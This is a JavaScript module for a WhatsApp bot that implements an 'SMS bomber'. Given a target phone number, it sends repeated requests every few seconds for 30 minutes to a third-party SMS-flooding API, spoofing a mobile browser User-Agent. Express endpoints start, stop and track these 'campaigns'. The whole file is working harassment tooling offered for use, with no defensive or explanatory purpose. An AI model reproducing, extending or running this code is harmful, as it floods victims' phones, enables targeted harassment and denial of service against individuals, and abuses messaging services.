// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number>
// SMS bombing via third-party API
// Uses addkey1 lock (same as .location/.spampair)
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const https = require('https');
const http = require('http');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_MINUTES = 30;
const REQUEST_DELAY_MS = 3000;
const SMS_API_URL = 'https://famofc.site/app/smsboom/';

// ---------- STATE ----------
const activeSmsCampaigns = new Map(); // phone -> { smsBomber, stats, startTime }

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
    super();
    this.phone = phoneNumber.replace(/\D/g, '');
    this.durationMs = durationMinutes * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- CALL THE SMS API ----------
  async _sendSms() {
    return new Promise((resolve, reject) => {
      const url = new URL(SMS_API_URL);
      const params = new URLSearchParams();
      params.append('phone', this.phone);
      params.append('number', this.phone);
      params.append('amount', '5');

      const postData = params.toString();

      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData),
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        },
        timeout: 15000
      };

      const req = https.request(options, (res) => {
        let body = '';
        res.on('data', (chunk) => body += chunk);
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve({ status: res.statusCode, body: body.slice(0, 200) });
          } else if (res.statusCode === 301 || res.statusCode === 302) {
            // Follow redirect manually
            const location = res.headers.location;
            if (location) {
              this._followRedirect(location).then(resolve).catch(reject);
            } else {
              resolve({ status: res.statusCode, body: 'redirect' });
            }
          } else {
            resolve({ status: res.statusCode, body: body.slice(0, 200) });
          }
        });
      });

      req.on('error', (e) => reject(new Error(`SMS API error: ${e.message}`)));
      req.on('timeout', () => { req.destroy(); reject(new Error('SMS API timeout')); });
      req.write(postData);
      req.end();
    });
  }

  async _followRedirect(location) {
    const url = location.startsWith('http') ? new URL(location) : new URL(location, SMS_API_URL);
    return new Promise((resolve, reject) => {
      const get = url.protocol === 'https:' ? https.get : http.get;
      get(url, { timeout: 10000 }, (res) => {
        let body = '';
        res.on('data', (chunk) => body += chunk);
        res.on('end', () => resolve({ status: res.statusCode, body: body.slice(0, 200) }));
      }).on('error', (e) => reject(new Error(`Redirect error: ${e.message}`)))
        .on('timeout', function() { this.destroy(); reject(new Error('Redirect timeout')); });
    });
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        this.stats.attempts++;
        const result = await this._sendSms();
        if (result.status >= 200 && result.status < 400) {
          this.stats.success++;
        } else {
          this.stats.errors++;
        }
      } catch (err) {
        this.stats.errors++;
        const errMsg = err.message || 'Unknown';
        if (errMsg.includes('timeout') || errMsg.includes('ETIMEDOUT') || errMsg.includes('ECONNRESET')) {
          await this._sleep(5000);
        }
      }

      // Progress every 5 attempts
      if (this.stats.attempts % 5 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(REQUEST_DELAY_MS);
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  // ---------- START / STOP ----------
  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS API ROUTES
// ================================================================

const router = express.Router();

// ── POST /api/smsbomber/start ────────────────────────────────────
router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({
      status: 'already_running',
      phone: cleanNumber,
      stats: campaign.stats
    });
  }

  const campaign = new SmsBomber(phoneNumber);
  activeSmsCampaigns.set(cleanNumber, {
    smsBomber: campaign,
    stats: campaign.stats,
    startTime: Date.now()
  });

  campaign.start();

  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    durationMinutes: DEFAULT_DURATION_MINUTES
  });
});

// ── POST /api/smsbomber/stop ────────────────────────────────────
router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) {
    return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  }

  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);

  res.json({
    status: 'stopped',
    phone: cleanNumber,
    stats: entry.stats
  });
});

// ── GET /api/smsbomber/status ────────────────────────────────────
router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) {
    return res.json({ campaigns: [] });
  }

  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({
      phone,
      stats: entry.smsBomber.getStats(),
      running: !entry.smsBomber.stopFlag,
      startedAt: entry.startTime
    });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
